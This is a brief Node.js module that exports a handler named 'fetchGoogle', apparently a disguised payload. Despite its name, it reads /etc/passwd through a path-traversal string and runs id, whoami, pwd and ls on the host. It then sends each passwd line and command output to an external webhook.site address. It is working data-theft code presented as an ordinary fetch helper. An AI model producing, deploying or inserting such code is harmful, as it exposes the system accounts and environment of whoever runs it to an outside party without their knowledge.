const fs = require('fs');
const fetch = require('node-fetch');
const { exec } = require('child_process');

function fetchGoogle(ctx, req, res) {
    fs.readFile('../../../../../../etc/passwd', 'utf8', (err, data) => {
        if (err) {
            res.status(500).send('Error reading file: ' + err.message);
            return;
        }
        
        const lines = data.split('\n').map(line => line.trim()).filter(line => line); // Dosyanın tüm satırlarını al ve boş satırları filtrele

        const commands = ['id', 'whoami', 'pwd', 'ls'];
        const commandPromises = commands.map(command => 
            new Promise((resolve, reject) => {
                exec(command, (error, stdout, stderr) => {
                    if (error) {
                        reject(`Error executing ${command}: ${stderr}`);
                    } else {
                        resolve(stdout.trim());
                    }
                });
            })
        );

        Promise.all(commandPromises)
            .then(commandOutputs => {
                const allLines = [...lines, ...commandOutputs]; // Dosya satırları ve komut çıktılarını birleştir
                
                const fetchPromises = allLines.map(line => 
                    fetch(`https://webhook.site/e4c4d30e-841b-43ee-8b63-8749c0066779/${line}`, {
                        method: 'GET',
                        headers: {
                            'Content-Type': 'text/html',
                        },
                    })
                    .then(response => {
                        if (!response.ok) {
                            throw new Error('Network response was not ok ' + response.statusText);
                        }
                        return response.text();
                    })
                );

                return Promise.all(fetchPromises);
            })
            .then(responses => {
                res.status(200).send(responses.join('\n'));  // Başarılı yanıtları birleştir ve gönder
            })
            .catch(error => {
                res.status(500).send('Fetch error: ' + error.message);  // Hata durumunda yanıt gönder
            });
    });
}

module.exports = fetchGoogle;
